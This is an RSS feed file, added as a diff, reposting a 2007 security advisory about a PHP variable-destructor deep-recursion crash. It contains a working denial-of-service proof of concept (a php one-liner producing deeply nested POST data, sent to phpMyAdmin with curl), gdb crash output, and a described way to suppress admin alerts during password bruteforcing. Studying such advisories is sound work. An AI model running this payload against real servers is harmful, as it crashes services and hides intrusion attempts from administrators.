@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "PHP Variable Destructor Deep Recursion Stack Overflow"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "PHP Variable Destructor Deep Recursion Stack Overflow"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>PHP Variable Destructor Deep Recursion Stack Overflow</title>
+				<description><![CDATA[ <b>Source:</b>
+<span class="link"> http://www.php-security.org/MOPB/MOPB-03-2007.html</span>
+
+<b>Credit:</b>
+Stefan Esser
+
+<b>Summary:</b>
+The last vulnerability for today is similar to the second one. This time the bug is however a deep recursion bug in the Zend Engine variable destruction. User input is parsed in an iterative way which allows the creation of very deeply nested array structures from user input. However when PHP tries to destroy such a variable it does it in a recursive way which will lead to a remote crash against PHP installations. 
+
+<b>Affected versions:</b>
+All versions of PHP are affected.
+
+<b>Detailed information:</b>
+One of the problems in PHP is that it does not enforce any kind of sanity checks for the depth of nested arrays and because the variable registration is done in a iterative way it will accept any depth until the memory_limit is reached. Unfortunately the destruction of PHP arrays is done in a recursive way and therefore it can crash when the stack limit is exhausted. 
+
+An attacker can use this fact to let PHP crash in a more or less controlled way. It is trivial to let it crash on script startup (as demonstrated below) or at the end of the request. This might result in things like the request not being logged. However much more interesting for an attacker is to let the script die after it did one action but before it performs another one. Imagine the following PHP code.
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>if &#40;!checkUserPWD&#40;$user, $pass&#41;&#41; {
+    $errmsg = "There is problem ...";
+    displayError&#40;$errmsg&#41;;
+    notifyAdminOfCrackAttempt&#40;&#41;;     
+  } else {
+    // do all the fun
+  }</pre>
+		</div>
+
+An attacker might not want to notify the admin by sending out millions of notification emails while he bruteforces the password of another user. But now imagine the target has register globals activated. You can supply a deeply nested array variable called 'errmsg'. Then the username and password check fails it will overwrite the variable which will result in the user supplied array being destructed. This of course will crash PHP and you can bruteforce the password without notification emails. There will be crashes in the logfile but the admin will not be able to see what caused it. 
+
+<b>This exploit might fail if you are running a low memory_limit</b> 
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>$ php -r 'echo "a".str_repeat&#40;"&#91;&#93;",200000&#41;."=1&a=0";' &gt; postdata
+$ curl<span class="link"> http://127.0.0.1/phpmyadmin/</span> -d @postdata
+curl: &#40;52&#41; Empty reply from server</pre>
+		</div>
+
+And looking at the Apache process at the same time with gdb
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>$ gdb
+&#40;...&#41;
+&#40;gdb&#41; attach 12345
+&#40;gdb&#41; continue
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+&#91;Switching to Thread -1211787584 &#40;LWP 7069&#41;&#93;
+0xb7928e2c in zend_hash_destroy &#40;&#41; from /usr/lib/apache/1.3/libphp5.so
+&#40;gdb&#41; bt
+#0  0xb7928e2c in zend_hash_destroy &#40;&#41; from /usr/lib/apache/1.3/libphp5.so
+#1  0xb791dd08 in _zval_dtor_func &#40;&#41; from /usr/lib/apache/1.3/libphp5.so
+#2  0xb7912f88 in _zval_ptr_dtor &#40;&#41; from /usr/lib/apache/1.3/libphp5.so
+#3  0xb7928ee8 in zend_hash_destroy &#40;&#41; from /usr/lib/apache/1.3/libphp5.so
+#4  0xb791dd08 in _zval_dtor_func &#40;&#41; from /usr/lib/apache/1.3/libphp5.so
+#5  0xb7912f88 in _zval_ptr_dtor &#40;&#41; from /usr/lib/apache/1.3/libphp5.so
+...
+&#40;gdb&#41; x/5i $eip
+0xb7928e2c :      call   0xb7704570 
+0xb7928e31 :      add    $0x2aa7bb,%ebx
+0xb7928e37 :      mov    0x20&#40;%edx&#41;,%eax
+0xb7928e3a :      mov    %eax,&#40;%esp&#41;
+0xb7928e3d :      call   0xb7927d10 
+&#40;gdb&#41; x/20x $esp-4
+0xbf322ffc:     Cannot access memory at address 0xbf322ffc</pre>
+		</div>
+
+From the backtrace and the registers one can see that PHP tried calling a function but because the stackpointer points to a not paged memory address it will result in a crash.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/8227.hva#47999</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/8227.hva#47999</link>
+				<pubDate><![CDATA[Tue, 20 Mar 2007 05:28:35]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+	</channel>
+</rss>
